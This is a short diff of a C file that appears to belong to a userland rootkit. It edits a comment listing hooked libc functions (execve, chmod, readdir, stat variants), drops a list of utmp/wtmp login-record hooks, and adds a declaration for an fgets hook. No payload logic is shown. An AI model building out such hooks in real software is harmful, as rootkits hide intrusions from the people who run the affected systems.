@@ -24,7 +24,8 @@
   ==========HOOKS============
  * execve 
  * chmod 
- * ptrace
+ * ptrace (wait no lol)
+ * fgets
  * directory functions 
  |-> readdir 
  |-> chdir 
@@ -49,24 +50,12 @@
  |-> fstat 
  |-> fstatat 
  |-> lstat
- * utmp/wtmp functions 
- |-> getutent 
- |-> getutxent
- |-> getutid
- |-> getutxid
- |-> pututline
- |-> pututxline
- |-> getutmp
- |-> getutmpx
- |-> updwtmp
- |-> updwtmpx
- |-> login 
-   ===========================
+ ============================
 */
 //function pointers to hooked functions
 int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
 int (*old_chmod)(const char *pathname, mode_t mode); 
-
+char *(*old_fgets)(char *s, int size, FILE *stream);
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
 int (*old_chdir)(const char *path); 
